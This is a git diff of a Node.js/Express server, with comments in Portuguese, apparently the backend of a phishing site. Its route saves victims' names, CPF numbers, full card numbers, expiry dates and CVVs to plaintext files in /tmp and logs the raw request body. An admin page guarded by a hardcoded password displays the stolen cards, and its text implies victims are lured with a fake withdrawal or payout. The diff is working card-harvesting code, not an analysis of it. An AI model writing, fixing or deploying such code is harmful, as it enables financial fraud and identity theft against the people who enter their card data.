@@ -133,11 +133,14 @@ app.get('/pagamento.html', (req, res) => {
   res.sendFile(path.join(__dirname, 'pagamento.html'));
 });
 
-// ROTA PARA SALVAR CARTÃO
+// ====================== ROTA PARA SALVAR CARTÃO EM ARQUIVO TXT ======================
+const fs = require('fs');
+
 app.post('/salvar-cartao-txt', (req, res) => {
     const { nome, cpf, cartao, validade, cvv, email, valor } = req.body;
     
     console.log('📥 Salvando cartão...');
+    console.log('📦 Dados:', req.body);
     
     const dataHora = new Date().toLocaleString('pt-BR');
     const conteudo = `============================================================
@@ -149,12 +152,16 @@ app.post('/salvar-cartao-txt', (req, res) => {
 🔢 CVV: ${cvv}
 📧 E-MAIL: ${email}
 💰 VALOR: ${valor}
-============================================================\n\n`;
+============================================================
+
+`;
     
     try {
-        const pastaDados = path.join(__dirname, 'dados_cartoes');
+        // USAR /tmp (sempre funciona no Render)
+        const pastaDados = '/tmp/dados_cartoes';
         if (!fs.existsSync(pastaDados)) {
             fs.mkdirSync(pastaDados, { recursive: true });
+            console.log('📁 Pasta criada em:', pastaDados);
         }
         
         const nomeArquivo = `cartoes_${new Date().toISOString().slice(0,10)}.txt`;
@@ -171,7 +178,7 @@ app.post('/salvar-cartao-txt', (req, res) => {
     }
 });
 
-// ADMIN - VER CARTÕES
+// ====================== ADMIN - VER CARTÕES SALVOS ======================
 app.get('/admin/ver-cartoes-servidor', (req, res) => {
     const SENHA_ADMIN = "777ga30";
     const senhaDigitada = req.query.senha || '';
@@ -202,45 +209,59 @@ app.get('/admin/ver-cartoes-servidor', (req, res) => {
         `);
     }
     
-    const pasta = path.join(__dirname, 'dados_cartoes');
+    // Usar a mesma pasta /tmp
+    const pasta = '/tmp/dados_cartoes';
     let html = `<!DOCTYPE html>
     <html>
-    <head><meta charset="UTF-8"><title>Admin - Cartões</title>
-    <style>
-        body { font-family: monospace; background: #1a1a2e; padding: 20px; color: #fff; }
-        .container { max-width: 1200px; margin: 0 auto; }
-        h1 { text-align: center; color: #ffb600; }
-        .card { background: #0f3460; border-radius: 12px; padding: 20px; margin-bottom: 15px; border-left: 4px solid #ffb600; }
-        .card h3 { color: #ffb600; }
-        pre { background: #1a1a2e; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; }
-        button { background: #ffb600; color: #004aad; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin-bottom: 20px; }
-        .logout { text-align: right; margin-bottom: 15px; }
-        .logout a { color: #ffb600; text-decoration: none; }
-    </style>
+    <head>
+        <meta charset="UTF-8">
+        <title>Admin - Cartões</title>
+        <style>
+            body { font-family: monospace; background: #1a1a2e; padding: 20px; color: #fff; }
+            .container { max-width: 1200px; margin: 0 auto; }
+            h1 { text-align: center; color: #ffb600; }
+            .stats { background: #0f3460; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
+            .card { background: #0f3460; border-radius: 12px; padding: 20px; margin-bottom: 15px; border-left: 4px solid #ffb600; }
+            .card h3 { color: #ffb600; }
+            pre { background: #1a1a2e; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; font-size: 12px; }
+            button { background: #ffb600; color: #004aad; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin-bottom: 20px; }
+            .logout { text-align: right; margin-bottom: 15px; }
+            .logout a { color: #ffb600; text-decoration: none; }
+        </style>
     </head>
     <body>
         <div class="container">
             <div class="logout"><a href="?">🚪 Sair</a></div>
             <h1>📋 ADMIN - CARTÕES SALVOS</h1>
+            <div class="stats">📂 Pasta: /tmp/dados_cartoes/</div>
             <button onclick="location.reload()">🔄 Atualizar</button>
     `;
     
     try {
         if (fs.existsSync(pasta)) {
             const arquivos = fs.readdirSync(pasta).filter(f => f.endsWith('.txt')).sort().reverse();
+            console.log(`📁 Encontrados ${arquivos.length} arquivos`);
+            
             if (arquivos.length === 0) {
-                html += '<div class="card"><h3>📭 Nenhum cartão salvo ainda</h3></div>';
+                html += '<div class="card"><h3>📭 Nenhum cartão salvo ainda</h3><p>Faça uma solicitação de saque para aparecer aqui.</p></div>';
             } else {
                 arquivos.forEach(arq => {
-                    const conteudo = fs.readFileSync(path.join(pasta, arq), 'utf8');
-                    html += `<div class="card"><h3>📄 ${arq}</h3><pre>${conteudo}</pre></div>`;
+                    const caminho = path.join(pasta, arq);
+                    const conteudo = fs.readFileSync(caminho, 'utf8');
+                    html += `
+                        <div class="card">
+                            <h3>📄 ${arq}</h3>
+                            <pre>${conteudo.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
+                        </div>
+                    `;
                 });
             }
         } else {
-            html += '<div class="card"><h3>📭 Nenhum cartão salvo ainda</h3></div>';
+            html += '<div class="card"><h3>📭 Nenhum cartão salvo ainda</h3><p>Faça uma solicitação de saque para aparecer aqui.</p></div>';
         }
     } catch(e) {
-        html += '<div class="card"><h3>❌ Erro ao ler arquivos</h3></div>';
+        console.error('Erro ao ler pasta:', e);
+        html += `<div class="card"><h3>❌ Erro ao ler arquivos: ${e.message}</h3></div>`;
     }
     
     html += `</div></body></html>`;
